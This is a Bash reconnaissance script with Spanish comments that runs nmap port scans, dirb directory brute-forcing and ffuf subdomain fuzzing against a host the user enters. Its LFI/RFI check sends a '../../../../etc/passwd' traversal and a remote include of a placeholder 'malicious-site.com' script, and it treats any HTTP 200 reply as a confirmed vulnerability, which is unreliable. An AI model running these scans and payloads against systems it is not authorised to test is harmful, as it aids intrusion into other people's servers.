#!/bin/bash

#Limpiar pantalla
clear

#Logo
echo "#######                      #       "
echo "#     # #    # #    # #####  #    #  "
echo "#     # #   #  #    # #    # #    #  "
echo "#     # ####   #    # #    # #    #  "
echo "#     # #  #   #    # #    # ####### "
echo "#     # #   #  #    # #    #      #  "
echo "####### #    #  ####  #####       #  "

# Funcion para obtener la ip

obtener_direccion_ip() {
    echo "Ingresa la URL o la dirección IP a escanear:"
    read input
    
    # Extraer el dominio de una URL si es necesario
    if [[ $input =~ ^https?:// ]]; then
        # Extrae el dominio de la URL
        dominio=$(echo $input | sed -E 's#^https?://([^/]+).*#\1#')
    else
        dominio=$input
    fi
    
    # Verificar si la entrada es una dirección IP válida
    if [[ $dominio =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        host=$dominio
        tipo="IP"
    else
        # Si no es una dirección IP, realizar una búsqueda DNS con nslookup
        echo "Realizando búsqueda DNS para obtener la dirección IP de $dominio..."
        # Filtrar solo direcciones IPv4 y tomar la primera
        ip=$(nslookup $dominio | awk '/^Address: / { print $2 }' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
        
        if [ -z "$ip" ]; then
            echo "No se pudo obtener una dirección IPv4 para $dominio."
            tipo="Error"
        else
            host=$ip
            url=$dominio
            tipo="URL"
        fi
    fi
    
    echo "La dirección IP obtenida es: $host"
}

# Funcion para crear carpeta de trabajo

crear_directorio (){
    echo "Creando directorio de trabajo"
    echo
    
    if [ -d "$host" ]; then
        echo "El directorio $host ya existe."
    else
        # Crear el directorio
        mkdir -p "$host/nmap"
        mkdir -p "$host/directorios"
        mkdir -p "$host/subdominios"
        echo "Directorio $host y subcarpetas creados correctamente."
    fi
}

# Funcion scaneo de puertos

escanear_puertos() {
    # ping
    echo "Realizando ping a $host..."
    echo
    
    if ping -c 1 $host &> /dev/null; then
        echo "El host $host está disponible."
        echo
        
        # Scaneo con nmap
        echo "Realizando scaneo de puertos con Nmap en el host $host..."
        echo
        sudo nmap -sS -sV -O -p- -T4 --open -vvv -oA ./$host/nmap/resultado $host
        
    else
        echo "Error: El host $host no es correcto o está caído."
    fi
}

escanear_directorios() {
    echo "Realizando búsqueda de directorios de $host"
    echo
    
    # Preguntar al usuario si prefiere usar "http://" o "https://"
    echo "¿Deseas usar 'http://' o 'https://' para escanear los directorios? (http/https)"
    read protocolo
    
    # Verificar la respuesta del usuario y ejecutar dirb con el protocolo seleccionado
    case $protocolo in
        "http")
            dirb "http://$host" -N 302 -o ./$host/directorios/directorios.txt
        ;;
        "https")
            dirb "https://$host" -N 302 -o ./$host/directorios/directorios.txt
        ;;
        *)
            echo "Opción no válida. Se usará 'http://' por defecto."
            dirb "http://$host" -N 302 -o ./$host/directorios/directorios.txt
        ;;
    esac
}

descubrir_subdominios() {
    echo "Descubriendo subdominios de $url"
    echo
    
    # Opción para elegir el diccionario
    read -p "¿Desea usar su propio diccionario (1) o uno por defecto (2)? Ingrese el número correspondiente: " opcion_diccionario

    if [ "$opcion_diccionario" -eq 1 ]; then
        read -p "Por favor, ingrese la ruta de su diccionario: " ruta_diccionario
        diccionario="$ruta_diccionario"
    elif [ "$opcion_diccionario" -eq 2 ]; then
        diccionario="/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"
    else
        echo "Opción no válida. Por favor, ingrese 1 para su propio diccionario o 2 para uno por defecto."
        return 1
    fi

    echo "Diccionario seleccionado: $diccionario"
    echo "URL: $url"
    
    # Preguntar al usuario si prefiere usar "http://" o "https://"
    echo "¿Deseas usar 'http://' o 'https://' para escanear los directorios? (http/https)"
    read protocolo
    
    # Verificar la respuesta del usuario y ejecutar ffuf con el protocolo seleccionado
    case $protocolo in
        "http")
            ffuf -w "$diccionario" -u "http://$url" -H "Host:FUZZ.$url" -c -mc 200 > "./$host/subdominios/subdominios.txt"
        ;;
        "https")
            ffuf -w "$diccionario" -u "https://$url" -H "Host:FUZZ.$url" -c -mc 200 > "./$host/subdominios/subdominios.txt"
        ;;
        *)
            echo "Protocolo no válido. Por favor, seleccione 'http' o 'https'."
            return 1
        ;;
    esac
}

escanear_lfi_rfi_vuln () {
    echo "Introduce la URL para comprobar si es vulnerable a RFI o LFI"
    read input
    
    # Perform checks for LFI and RFI vulnerabilities
    echo "Comprobando vulnerabilidades en $input..."
    
    # Perform LFI check
    lfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=../../../../etc/passwd")
    if [ $lfi_result -eq 200 ]; then
        echo "Vulnerabilidad LFI detectada en $input"
    else
        echo "No se detecta vulnerabilidad LF en $input"
    fi
    
    # Perform RFI check
    rfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=http://malicious-site.com/malicious-script.php")
    if [ $rfi_result -eq 200 ]; then
        echo "Vulnerabilidad RFI detectada en $input"
    else
        echo "No se detecta ninguna vulnerabilidad RFI en $input"
    fi
}

# Opciones de escaneo
opciones_escaneo() {
    echo "Selecciona una opción de escaneo:"
    echo "1. Escaneo completo (puertos, directorios, subdominios)"
    echo "2. Escaneo de puertos y directorios"
    echo "3. Escaneo de directorios y subdominios"
    echo "4. Elegir solo uno de los escaneos"
    echo
    
    read opcion
    
    case $opcion in
        1)
            escanear_puertos
            escanear_directorios
            descubrir_subdominios
            # Siempre será la ultima opcion
            escanear_lfi_rfi_vuln
        ;;
        2)
            escanear_puertos
            escanear_directorios
        ;;
        3)
            escanear_directorios
            descubrir_subdominios
        ;;
        4)
            echo "Selecciona solo uno de los escaneos:"
            echo "a. Escaneo de puertos"
            echo "b. Escaneo de directorios"
            echo "c. Descubrir subdominios"
            echo "d. Escaneo posible LFI"
            
            read escaneo
            
            case $escaneo in
                a)
                    escanear_puertos
                ;;
                b)
                    escanear_directorios
                ;;
                c)
                    descubrir_subdominios
                ;;
                d)
                    escanear_lfi_rfi_vuln
                ;;
                *)
                    echo "Opción no válida."
                ;;
            esac
        ;;
        *)
            echo "Opción no válida."
        ;;
    esac
}

# LLamar a funcion para obtener IP o URL
obtener_direccion_ip

# Llamar a la función para crear el directorio de trabajo
crear_directorio

# Llamar a la función de opciones de escaneo
opciones_escaneo
